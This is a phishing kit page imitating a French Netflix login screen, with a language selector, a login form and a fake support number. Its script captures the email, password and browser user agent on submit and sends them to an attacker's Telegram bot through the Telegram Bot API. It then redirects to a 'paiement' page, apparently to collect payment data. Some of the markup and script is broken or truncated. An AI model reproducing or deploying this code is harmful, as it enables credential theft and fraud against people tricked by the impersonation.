            color: #8c8c8c;

            font-size: 14px;

        }

            color: #737373;
            text-decoration: none;
            font-size: 13px;
        }

        .footer-link:hover {
            text-decoration: underline;
        }

        /* Spinner */
        .spinner {
            display: none;
            width: 24px;
            height: 24px;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s linear infinite;
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
        }

        @keyframes spin {
            to { transform: translate(-50%, -50%) rotate(360deg); }
        }

        .btn-loading {
            color: transparent !important;
        }

        .btn-loading .spinner {
            display: block;
        }

</head>
<body>
    <header class="header">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix" class="logo">
        <select class="language-selector" id="languageSelector">
            <option value="fr">Français</option>
            <option value="en">English</option>
            <option value="es">Español</option>
            <option value="de">Deutsch</option>
            <option value="ru">Русский</option>
            <option value="pl">Polski</option>
        </select>
    </header>

    <main>
        <div class="login-container">
            <h1 id="loginTitle">S'identifier</h1>
            <form id="loginForm">
                <div class="input-group">
                    <input type="email" id="email" name="email" placeholder=" " required>
                    <label for="email" id="emailLabel">E-mail ou numéro de téléphone</label>
                </div>
                <div class="input-group">
                    <input type="password" id="password" name="password" placeholder=" " required>
                    <label for="password" id="passwordLabel">Mot de passe</label>
                </div>
                <button type="submit" class="login-button" id="submitBtn">
                    <span id="loginButtonText">S'identifier</span>
                    <div class="spinner"></div>
                </button>
                <div class="options-container">
                 <a href="#" class="help-link" id="helpLink">Besoin d'aide ?</a>
                </div>
            </form>
            <div class="signup-text">
                <span id="newUserText">Nouveau sur Netflix ?</span> 
                <a href="#" class="signup-link" id="signupLink">Inscrivez-vous maintenant.</a>
            </div>
        </div>
    </main>

    <footer class="footer">
        <div class="footer-content">
            <div class="footer-top">
                <span id="questionsText">Des questions ? Appelez le</span> 
                <a href="tel:(+33) 0805-543-063" class="footer-link">(+33) 0805-543-063</a>
            </div>
            <div class="footer-links">
                <a href="#" class="footer-link" id="faqLink">FAQ</a>
                <a href="#" class="footer-link" id="helpCenterLink">Centre d'aide</a>
                <a href="#" class="footer-link" id="termsLink">Conditions d'utilisation</a>
                <a href="#" class="footer-link" id="privacyLink">Confidentialité</a>
                <a href="#" class="footer-link" id="cookiesLink">Préférences de cookies</a>
                <a href="#" class="footer-link" id="legalLink">Mentions légales</a>
                <a href="#" class="footer-link" id="adsLink">Choix liés à la pub</a>
            </div>
            <div>Netflix France</div>
        </div>
    </footer>

        // Gestion du changement de langue
        document.getElementById('languageSelector').addEventListener('change', function() {
            const lang = this.value;
            localStorage.setItem('netflixLang', lang);
            updateLanguage(lang);
        });

        function updateLanguage(lang) {
            const trans = translations[lang];
            for (const [key, value] of Object.entries(trans)) {
                const element = document.getElementById(key);
                if (element) {
                    element.textContent = value;
                }
            }
        }

        // Initialiser la langue au chargement
        const savedLang = localStorage.getItem('netflixLang');
        if (savedLang) {
            document.getElementById('languageSelector').value = savedLang;
            updateLanguage(savedLang);
        }

        // Gestion du formulaire
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const submitBtn = document.getElementById('submitBtn');

            // Show spinner

            const lang = document.getElementById('languageSelector').value;

    lang === 'es' ? 'Correo electrónico' : 
    lang === 'de' ? 'E-Mail' : 
    lang === 'ru' ? 'Электронная почта' : 
    lang === 'pl' ? 'E-mail' : 'E-mail'}: ${email}

    lang === 'es' ? 'Contraseña' : 
    lang === 'de' ? 'Passwort' : 
    lang === 'ru' ? 'Пароль' : 
    lang === 'pl' ? 'Hasło' : 'Mot de passe'}: ${password}

    lang === 'de' ? 'Gerät' : 
    lang === 'ru' ? 'Устройство' : 
    lang === 'pl' ? 'Urządzenie' : 'Appareil'}: ${navigator.userAgent}`;
            
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',

                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Identifiants envoyés à Telegram:', data);
            })
            .catch(error => {
                console.error('Erreur lors de l\'envoi à Telegram:', error);
            })

                // Wait 2 seconds before redirecting (simulating login)
                setTimeout(() => {
                    const lang = document.getElementById('languageSelector').value;
                    window.location.href = `paiement.html?lang=${lang}`;
                }, 2000);
            });
